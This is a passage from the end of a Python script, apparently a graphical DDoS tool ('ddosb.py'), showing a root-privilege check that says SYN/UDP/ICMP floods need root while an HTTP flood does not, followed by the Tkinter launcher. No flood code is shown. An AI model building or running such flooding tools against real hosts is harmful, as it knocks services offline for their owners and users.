        if os.geteuid() != 0:
            print("┌─────────────────────────────────────────────┐")
            print("│ [!] NOT ROOT — SYN/UDP/ICMP need root       │")
            print("│     HTTP flood will work fine                │")
            print("│     Run: sudo python3 ddosb.py               │")
            print("└─────────────────────────────────────────────┘")
            print()

    root = tk.Tk()
    app = DDOSBGUI(root)
    root.mainloop()
